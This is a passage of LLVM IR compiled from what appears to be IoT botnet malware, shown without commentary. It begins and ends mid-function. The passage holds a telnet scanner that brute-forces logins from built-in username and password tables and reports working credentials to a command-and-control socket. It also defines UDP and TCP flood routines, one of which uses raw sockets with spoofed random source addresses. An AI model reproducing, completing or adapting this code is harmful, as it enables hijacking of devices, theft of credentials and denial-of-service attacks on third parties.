  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %527 = load i8*, i8** %393, align 8
  %528 = call i8* @strstr(i8* %527, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %529 = icmp eq i8* %528, null
  br i1 %529, label %534, label %530

; <label>:530:                                    ; preds = %526
  call void @llvm.memset.p0i8.i64(i8* %527, i8 0, i64 1024, i32 1, i1 false)
  %531 = load i32, i32* %391, align 16
  %532 = call i32 @sclose(i32 %531)
  store i8 0, i8* %34, align 8
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %533, align 1
  br label %711

; <label>:534:                                    ; preds = %526
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %527, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:535:                                    ; preds = %519
  %536 = load i32, i32* %391, align 16
  %537 = load i8*, i8** %393, align 8
  %538 = load i16, i16* %395, align 16
  %539 = zext i16 %538 to i32
  %540 = call i32 @readUntil(i32 %536, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %537, i32 1024, i32 %539)
  %541 = icmp eq i32 %540, 0
  br i1 %541, label %551, label %542

; <label>:542:                                    ; preds = %535
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %543 = load i8*, i8** %393, align 8
  %544 = call i8* @strstr(i8* %543, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %545 = icmp eq i8* %544, null
  br i1 %545, label %550, label %546

; <label>:546:                                    ; preds = %542
  call void @llvm.memset.p0i8.i64(i8* %543, i8 0, i64 1024, i32 1, i1 false)
  %547 = load i32, i32* %391, align 16
  %548 = call i32 @sclose(i32 %547)
  store i8 0, i8* %34, align 8
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %549, align 1
  br label %711

; <label>:550:                                    ; preds = %542
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %543, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:551:                                    ; preds = %535
  %552 = load i8*, i8** %393, align 8
  %553 = call i64 @strlen(i8* %552) #15
  %554 = trunc i64 %553 to i16
  store i16 %554, i16* %395, align 16
  %555 = load i32, i32* %384, align 4
  %556 = add i32 %555, 10
  %557 = zext i32 %556 to i64
  %558 = call i64 @time(i64* null) #3
  %559 = icmp slt i64 %557, %558
  br i1 %559, label %560, label %711

; <label>:560:                                    ; preds = %551
  %561 = load i32, i32* %391, align 16
  %562 = call i32 @sclose(i32 %561)
  store i8 0, i8* %34, align 8
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %563, align 1
  br label %711

; <label>:564:                                    ; preds = %.lr.ph
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %566 = load i32, i32* %565, align 16
  %567 = call i64 @send(i32 %566, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0), i64 4, i32 16384) #3
  %568 = icmp slt i64 %567, 0
  br i1 %568, label %569, label %573

; <label>:569:                                    ; preds = %564
  %570 = load i32, i32* %565, align 16
  %571 = call i32 @sclose(i32 %570)
  store i8 0, i8* %34, align 8
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %572, align 1
  br label %711

; <label>:573:                                    ; preds = %564
  store i8 8, i8* %34, align 8
  br label %711

; <label>:574:                                    ; preds = %.lr.ph
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %576 = load i32, i32* %575, align 16
  %577 = call i64 @send(i32 %576, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i64 0, i64 0), i64 9, i32 16384) #3
  %578 = icmp slt i64 %577, 0
  br i1 %578, label %579, label %583

; <label>:579:                                    ; preds = %574
  %580 = load i32, i32* %575, align 16
  %581 = call i32 @sclose(i32 %580)
  store i8 0, i8* %34, align 8
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %582, align 1
  br label %711

; <label>:583:                                    ; preds = %574
  store i8 9, i8* %34, align 8
  br label %711

; <label>:584:                                    ; preds = %.lr.ph
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %586 = load i32, i32* %585, align 16
  %587 = call i64 @send(i32 %586, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %588 = icmp slt i64 %587, 0
  br i1 %588, label %589, label %593

; <label>:589:                                    ; preds = %584
  %590 = load i32, i32* %585, align 16
  %591 = call i32 @sclose(i32 %590)
  store i8 0, i8* %34, align 8
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %592, align 1
  br label %711

; <label>:593:                                    ; preds = %584
  %594 = load i32, i32* @mainCommSock, align 4
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %596 = load i32, i32* %595, align 4
  %597 = call i8* @inet_ntoa(i32 %596) #3
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %599 = load i8, i8* %598, align 2
  %600 = zext i8 %599 to i64
  %601 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %600
  %602 = load i8*, i8** %601, align 8
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %604 = load i8, i8* %603, align 1
  %605 = zext i8 %604 to i64
  %606 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %605
  %607 = load i8*, i8** %606, align 8
  %608 = call i32 (i32, i8*, ...) @sockprintf(i32 %594, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %597, i8* %602, i8* %607)
  store i8 10, i8* %34, align 8
  br label %711

; <label>:609:                                    ; preds = %.lr.ph
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %611 = load i32, i32* %610, align 4
  %612 = icmp eq i32 %611, 0
  br i1 %612, label %613, label %616

; <label>:613:                                    ; preds = %609
  %614 = call i64 @time(i64* null) #3
  %615 = trunc i64 %614 to i32
  store i32 %615, i32* %610, align 4
  br label %616

; <label>:616:                                    ; preds = %613, %609
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %618 = load i32, i32* %617, align 16
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %620 = load i8*, i8** %619, align 8
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %622 = load i16, i16* %621, align 16
  %623 = zext i16 %622 to i32
  %624 = call i32 @readUntil(i32 %618, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %620, i32 1024, i32 %623)
  %625 = icmp eq i32 %624, 0
  br i1 %625, label %644, label %626

; <label>:626:                                    ; preds = %616
  store i32 0, i32* %610, align 4
  store i16 0, i16* %621, align 16
  %627 = load i32, i32* %617, align 16
  %628 = call i64 @send(i32 %627, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %629 = load i32, i32* @mainCommSock, align 4
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %631 = load i32, i32* %630, align 4
  %632 = call i8* @inet_ntoa(i32 %631) #3
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %634 = load i8, i8* %633, align 2
  %635 = zext i8 %634 to i64
  %636 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %635
  %637 = load i8*, i8** %636, align 8
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %639 = load i8, i8* %638, align 1
  %640 = zext i8 %639 to i64
  %641 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %640
  %642 = load i8*, i8** %641, align 8
  %643 = call i32 (i32, i8*, ...) @sockprintf(i32 %629, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %632, i8* %637, i8* %642)
  br label %711

; <label>:644:                                    ; preds = %616
  %645 = load i32, i32* %617, align 16
  %646 = load i8*, i8** %619, align 8
  %647 = load i16, i16* %621, align 16
  %648 = zext i16 %647 to i32
  %649 = call i32 @readUntil(i32 %645, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %646, i32 1024, i32 %648)
  %650 = icmp eq i32 %649, 0
  br i1 %650, label %669, label %651

; <label>:651:                                    ; preds = %644
  store i32 0, i32* %610, align 4
  store i16 0, i16* %621, align 16
  %652 = load i32, i32* %617, align 16
  %653 = call i64 @send(i32 %652, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %654 = load i32, i32* @mainCommSock, align 4
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %656 = load i32, i32* %655, align 4
  %657 = call i8* @inet_ntoa(i32 %656) #3
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %659 = load i8, i8* %658, align 2
  %660 = zext i8 %659 to i64
  %661 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %660
  %662 = load i8*, i8** %661, align 8
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %664 = load i8, i8* %663, align 1
  %665 = zext i8 %664 to i64
  %666 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %665
  %667 = load i8*, i8** %666, align 8
  %668 = call i32 (i32, i8*, ...) @sockprintf(i32 %654, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %657, i8* %662, i8* %667)
  br label %711

; <label>:669:                                    ; preds = %644
  %670 = load i32, i32* %617, align 16
  %671 = load i8*, i8** %619, align 8
  %672 = load i16, i16* %621, align 16
  %673 = zext i16 %672 to i32
  %674 = call i32 @readUntil(i32 %670, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %671, i32 1024, i32 %673)
  %675 = icmp eq i32 %674, 0
  br i1 %675, label %698, label %676

; <label>:676:                                    ; preds = %669
  store i32 0, i32* %610, align 4
  store i16 0, i16* %621, align 16
  %677 = load i32, i32* %617, align 16
  %678 = call i64 @send(i32 %677, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %679 = load i32, i32* @mainCommSock, align 4
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %681 = load i32, i32* %680, align 4
  %682 = call i8* @inet_ntoa(i32 %681) #3
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %684 = load i8, i8* %683, align 2
  %685 = zext i8 %684 to i64
  %686 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %685
  %687 = load i8*, i8** %686, align 8
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %689 = load i8, i8* %688, align 1
  %690 = zext i8 %689 to i64
  %691 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %690
  %692 = load i8*, i8** %691, align 8
  %693 = call i32 (i32, i8*, ...) @sockprintf(i32 %679, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %682, i8* %687, i8* %692)
  %694 = load i8*, i8** %619, align 8
  call void @llvm.memset.p0i8.i64(i8* %694, i8 0, i64 1024, i32 1, i1 false)
  %695 = load i32, i32* %617, align 16
  %696 = call i32 @sclose(i32 %695)
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %697, align 1
  store i8 0, i8* %34, align 8
  br label %711

; <label>:698:                                    ; preds = %669
  %699 = load i8*, i8** %619, align 8
  %700 = call i64 @strlen(i8* %699) #15
  %701 = trunc i64 %700 to i16
  store i16 %701, i16* %621, align 16
  %702 = load i32, i32* %610, align 4
  %703 = add i32 %702, 10
  %704 = zext i32 %703 to i64
  %705 = call i64 @time(i64* null) #3
  %706 = icmp slt i64 %704, %705
  br i1 %706, label %707, label %711

; <label>:707:                                    ; preds = %698
  %708 = load i32, i32* %617, align 16
  %709 = call i32 @sclose(i32 %708)
  store i8 0, i8* %34, align 8
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %710, align 1
  br label %711

; <label>:711:                                    ; preds = %.lr.ph, %251, %382, %573, %583, %593, %84, %81, %132, %126, %225, %216, %356, %348, %560, %551, %707, %698, %61, %676, %651, %626, %589, %579, %569, %550, %546, %534, %530, %518, %514, %502, %498, %486, %482, %470, %466, %454, %450, %438, %434, %427, %415, %411, %404, %378, %372, %344, %337, %330, %323, %316, %309, %302, %295, %288, %280, %269, %247, %241, %215, %201, %187, %173, %159, %115, %60
  %712 = add nsw i32 %.1333, 1
  %713 = icmp slt i32 %712, %11
  %.mux = select i1 %713, i32 %712, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #13 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i64 @time(i64* null) #3
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #3
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %35, %3
  %.0 = phi i32 [ 0, %3 ], [ %36, %35 ]
  %27 = icmp ugt i32 %.0, 49
  br i1 %27, label %28, label %35

; <label>:28:                                     ; preds = %26
  %29 = call i64 @send(i32 %5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0), i64 50, i32 0) #3
  %30 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #3
  %31 = call i64 @time(i64* null) #3
  %32 = icmp slt i64 %31, %25
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %28
  %34 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #17
  unreachable

; <label>:35:                                     ; preds = %28, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %28 ]
  %36 = add i32 %.1, 1
  br label %26
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %60

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #3
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i64 @time(i64* null) #3
  %39 = zext i32 %2 to i64
  %40 = add i64 %38, %39
  %41 = sext i32 %4 to i64
  %42 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %sext61 = shl i64 %40, 32
  %43 = ashr exact i64 %sext61, 32
  br i1 %10, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %37
  br label %.split

.split.us.preheader:                              ; preds = %37
  br label %.split.us

.split.us:                                        ; preds = %.split.us.backedge, %.split.us.preheader
  %.058.us = phi i32 [ 0, %.split.us.preheader ], [ %.058.us.be, %.split.us.backedge ]
  %44 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %41, i32 0, %struct.sockaddr* nonnull %42, i32 16) #3
  %45 = icmp eq i32 %.058.us, %5
  br i1 %45, label %48, label %46

; <label>:46:                                     ; preds = %.split.us
  %47 = add i32 %.058.us, 1
  br label %.split.us.backedge

; <label>:48:                                     ; preds = %.split.us
  %49 = call i32 @rand_cmwc()
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %18, align 2
  %51 = call i64 @time(i64* null) #3
  %52 = icmp sgt i64 %51, %43
  br i1 %52, label %.loopexit.loopexit, label %.split.us.backedge

.split.us.backedge:                               ; preds = %48, %46
  %.058.us.be = phi i32 [ %47, %46 ], [ 0, %48 ]
  br label %.split.us

.split:                                           ; preds = %.split.backedge, %.split.preheader
  %.058 = phi i32 [ 0, %.split.preheader ], [ %.058.be, %.split.backedge ]
  %53 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %41, i32 0, %struct.sockaddr* nonnull %42, i32 16) #3
  %54 = icmp eq i32 %.058, %5
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %.split
  %56 = call i64 @time(i64* null) #3
  %57 = icmp sgt i64 %56, %43
  br i1 %57, label %.loopexit.loopexit71, label %.split.backedge

; <label>:58:                                     ; preds = %.split
  %59 = add i32 %.058, 1
  br label %.split.backedge

.split.backedge:                                  ; preds = %58, %55
  %.058.be = phi i32 [ %59, %58 ], [ 0, %55 ]
  br label %.split

; <label>:60:                                     ; preds = %22
  %61 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %60
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %.loopexit

; <label>:66:                                     ; preds = %60
  store i32 1, i32* %8, align 4
  %67 = bitcast i32* %8 to i8*
  %68 = call i32 @setsockopt(i32 %61, i32 0, i32 3, i8* nonnull %67, i32 4) #3
  %69 = icmp slt i32 %68, 0
  br i1 %69, label %70, label %.preheader.preheader

.preheader.preheader:                             ; preds = %66
  br label %.preheader

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05964 = phi i32 [ %73, %.preheader ], [ 50, %.preheader.preheader ]
  %73 = add nsw i32 %.05964, -1
  %74 = call i64 @time(i64* null) #3
  %75 = call i32 @rand_cmwc()
  %76 = zext i32 %75 to i64
  %77 = xor i64 %76, %74
  %78 = trunc i64 %77 to i32
  call void @srand(i32 %78) #3
  %79 = call i32 @rand() #3
  call void @init_rand(i32 %79)
  %80 = icmp eq i32 %73, 0
  br i1 %80, label %81, label %.preheader

; <label>:81:                                     ; preds = %.preheader
  %82 = icmp eq i32 %3, 0
  %83 = sub nsw i32 32, %3
  %84 = shl i32 -1, %83
  %.060 = select i1 %82, i32 0, i32 %84
  %85 = sext i32 %4 to i64
  %86 = add nsw i64 %85, 28
  %87 = call i8* @llvm.stacksave()
  %88 = alloca i8, i64 %86, align 16
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @getRandomIP(i32 %.060)
  %94 = call i32 @htonl(i32 %93) #18
  %95 = add nsw i64 %85, 8
  %96 = trunc i64 %95 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %89, i32 %92, i32 %94, i8 zeroext 17, i32 %96)
  %97 = trunc i64 %95 to i16
  %98 = call zeroext i16 @htons(i16 zeroext %97) #18
  %99 = getelementptr inbounds i8, i8* %88, i64 24
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = bitcast i8* %90 to i16*
  store i16 %102, i16* %103, align 4
  br i1 %10, label %104, label %106

; <label>:104:                                    ; preds = %81
  %105 = call i32 @rand_cmwc()
  br label %110

; <label>:106:                                    ; preds = %81
  %107 = trunc i32 %1 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #18
  %109 = zext i16 %108 to i32
  br label %110

; <label>:110:                                    ; preds = %106, %104
  %.pre-phi = phi i16 [ %107, %106 ], [ 0, %104 ]
  %111 = phi i32 [ %109, %106 ], [ %105, %104 ]
  %112 = trunc i32 %111 to i16
  %113 = getelementptr inbounds i8, i8* %88, i64 22
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  %115 = getelementptr inbounds i8, i8* %88, i64 26
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  %117 = getelementptr inbounds i8, i8* %88, i64 28
  call void @makeRandomStr(i8* %117, i32 %4)
  %118 = bitcast i8* %88 to i16*
  %119 = getelementptr inbounds i8, i8* %88, i64 2
  %120 = bitcast i8* %119 to i16*
  %121 = load i16, i16* %120, align 2
  %122 = zext i16 %121 to i32
  %123 = call zeroext i16 @csum(i16* nonnull %118, i32 %122)
  %124 = getelementptr inbounds i8, i8* %88, i64 10
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  %126 = call i64 @time(i64* null) #3
  %127 = zext i32 %2 to i64
  %128 = add i64 %126, %127
  %129 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %130 = getelementptr inbounds i8, i8* %88, i64 4
  %131 = bitcast i8* %130 to i16*
  %132 = getelementptr inbounds i8, i8* %88, i64 12
  %133 = bitcast i8* %132 to i32*
  %sext = shl i64 %128, 32
  %134 = ashr exact i64 %sext, 32
  br i1 %10, label %.split63.us.preheader, label %.split63.preheader

.split63.preheader:                               ; preds = %110
  br label %.split63

.split63.us.preheader:                            ; preds = %110
  br label %.split63.us

.split63.us:                                      ; preds = %.split63.us.backedge, %.split63.us.preheader
  %.0.us = phi i32 [ 0, %.split63.us.preheader ], [ %.0.us.be, %.split63.us.backedge ]
  %135 = call i64 @sendto(i32 %61, i8* nonnull %88, i64 %86, i32 0, %struct.sockaddr* nonnull %129, i32 16) #3
  %136 = call i32 @rand_cmwc()
  %137 = trunc i32 %136 to i16
  store i16 %137, i16* %103, align 4
  %138 = call i32 @rand_cmwc()
  %139 = trunc i32 %138 to i16
  store i16 %139, i16* %114, align 2
  %140 = call i32 @rand_cmwc()
  %141 = trunc i32 %140 to i16
  store i16 %141, i16* %131, align 4
  %142 = call i32 @getRandomIP(i32 %.060)
  %143 = call i32 @htonl(i32 %142) #18
  store i32 %143, i32* %133, align 4
  %144 = load i16, i16* %120, align 2
  %145 = zext i16 %144 to i32
  %146 = call zeroext i16 @csum(i16* nonnull %118, i32 %145)
  store i16 %146, i16* %125, align 2
  %147 = icmp eq i32 %.0.us, %5
  br i1 %147, label %150, label %148

; <label>:148:                                    ; preds = %.split63.us
  %149 = add i32 %.0.us, 1
  br label %.split63.us.backedge

; <label>:150:                                    ; preds = %.split63.us
  %151 = call i64 @time(i64* null) #3
  %152 = icmp sgt i64 %151, %134
  br i1 %152, label %.us-lcssa.us.loopexit, label %.split63.us.backedge

.split63.us.backedge:                             ; preds = %150, %148
  %.0.us.be = phi i32 [ %149, %148 ], [ 0, %150 ]
  br label %.split63.us

.split63:                                         ; preds = %.split63.backedge, %.split63.preheader
  %.0 = phi i32 [ 0, %.split63.preheader ], [ %.0.be, %.split63.backedge ]
  %153 = call i64 @sendto(i32 %61, i8* nonnull %88, i64 %86, i32 0, %struct.sockaddr* nonnull %129, i32 16) #3
  %154 = call i32 @rand_cmwc()
  %155 = trunc i32 %154 to i16
  store i16 %155, i16* %103, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #18
  store i16 %156, i16* %114, align 2
  %157 = call i32 @rand_cmwc()
  %158 = trunc i32 %157 to i16
  store i16 %158, i16* %131, align 4
  %159 = call i32 @getRandomIP(i32 %.060)
  %160 = call i32 @htonl(i32 %159) #18
  store i32 %160, i32* %133, align 4
  %161 = load i16, i16* %120, align 2
  %162 = zext i16 %161 to i32
  %163 = call zeroext i16 @csum(i16* nonnull %118, i32 %162)
  store i16 %163, i16* %125, align 2
  %164 = icmp eq i32 %.0, %5
  br i1 %164, label %165, label %168

; <label>:165:                                    ; preds = %.split63
  %166 = call i64 @time(i64* null) #3
  %167 = icmp sgt i64 %166, %134
  br i1 %167, label %.us-lcssa.us.loopexit72, label %.split63.backedge

; <label>:168:                                    ; preds = %.split63
  %169 = add i32 %.0, 1
  br label %.split63.backedge

.split63.backedge:                                ; preds = %168, %165
  %.0.be = phi i32 [ %169, %168 ], [ 0, %165 ]
  br label %.split63

.us-lcssa.us.loopexit:                            ; preds = %150
  br label %.us-lcssa.us

.us-lcssa.us.loopexit72:                          ; preds = %165
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit72, %.us-lcssa.us.loopexit
  call void @llvm.stackrestore(i8* %87)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit.loopexit71:                             ; preds = %55
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit71, %.loopexit.loopexit, %17, %32, %.us-lcssa.us, %70, %63, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
